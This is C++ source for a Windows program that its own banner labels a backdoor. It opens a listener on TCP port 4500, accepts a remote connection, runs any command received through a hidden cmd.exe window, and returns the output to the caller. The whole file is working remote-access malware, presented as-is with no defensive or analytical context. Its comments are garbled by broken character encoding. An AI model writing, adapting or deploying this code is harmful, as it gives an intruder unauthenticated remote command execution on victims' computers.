// door.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <stdio.h>
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

int main(int argc, char* argv[])
{
	char wMessage[512] = "\r\n========================  BackDoor by �����ѩ  ========================\r\n";
	//��ʼ��socket���������˿�
	SOCKET sClient;
	BYTE minorVer = 2; 
	BYTE majorVer = 2;
	WSADATA wsaData;
	WORD sockVersion = MAKEWORD(minorVer, majorVer);
	if(WSAStartup(sockVersion, &wsaData) != 0)
        return 0;
	SOCKET sListen = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if(sListen == INVALID_SOCKET)
	{
		printf("socket error \n");
		return 0;
	}
	sockaddr_in sin;
	sin.sin_family = AF_INET;
	sin.sin_port = htons(4500);
	sin.sin_addr.S_un.S_addr = INADDR_ANY;	
	if(bind(sListen, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
	{
		printf("bind error \n");
		return 0;
	}
	if(listen(sListen, 5) == SOCKET_ERROR)
	{
		printf("listen error \n");
		return 0;
	}
    //��������
    sClient  =accept(sListen,NULL,NULL);
	//���ͻ�ӭ��Ϣ
	send(sClient,wMessage,strlen(wMessage),0);
	char rBuffer[1024] = {0};
	char cmdline[256]={0};
	//ѭ�������ڽ��������������ִ�У����ӹܵ��ж���ִ�н�����ظ�Զ������
	while(true)
	{
		//cmdline����
		memset(cmdline,0,256);
		SECURITY_ATTRIBUTES sa;
		HANDLE hRead,hWrite;
		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;
		if (!CreatePipe(&hRead,&hWrite,&sa,0)) 
		{
			printf("CreatePipe Error");
			return 0;
		} 	
		STARTUPINFO si;
		PROCESS_INFORMATION pi; 
		si.cb = sizeof(STARTUPINFO);
		GetStartupInfo(&si); 
		//ʹcmd�͹ܵ�������ע�������˫�ܵ��������si.hStdInput = hReadPipe;��Ϊ�����ɴ�����ִ�д���
		si.hStdError = hWrite;
		si.hStdOutput = hWrite;
		si.wShowWindow = SW_HIDE;
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		//�õ�ϵͳĿ¼
		GetSystemDirectory(cmdline,sizeof(cmdline));
		strcat(cmdline,"\\cmd.exe /c");
		char cmdbuff[256];
		//����Զ������
		int   rLen=recv(sClient,cmdbuff,256,NULL);
		if(rLen==SOCKET_ERROR)
			return 0;
		//��cmd���������
		strncat(cmdline,cmdbuff,strlen(cmdbuff));
		//��������ִ������
		if (!CreateProcess(NULL,cmdline,NULL,NULL,TRUE,NULL,NULL,NULL,&si,&pi)) 
		{
			printf("CreateProcess Error");
			continue;
		}
		
		CloseHandle(hWrite);
		DWORD dwRead;
		//ѭ�������ӹܵ��еķ�����Ϣ��Ҳ����ִ�������ķ�����Ϣ
		while(ReadFile(hRead,rBuffer,1024,&dwRead,NULL))
		{  
			//����ִ�н��
			send(sClient,rBuffer,strlen(rBuffer),0);
			memset(rBuffer,0,1024);
			
		}		
	}
	return 0;
}
